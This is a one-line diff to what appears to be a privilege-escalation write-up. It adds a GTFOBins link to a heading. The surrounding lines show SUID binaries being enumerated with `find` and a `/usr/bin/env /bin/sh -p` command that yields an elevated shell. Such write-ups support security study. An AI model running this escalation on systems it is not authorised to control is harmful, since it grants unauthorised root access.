@@ -167,7 +167,7 @@ find / -user root -perm -u=s 2>/dev/null
 
 The `/usr/bin/env` binary has the SUID bit set, allowing it to execute commands with elevated privileges.
 
-**Exploitation using GTFOBins:**
+**Exploitation using [GTFOBins](https://gtfobins.github.io/gtfobins/env/):**
 
 ```bash
 bash-4.4$ /usr/bin/env /bin/sh -p
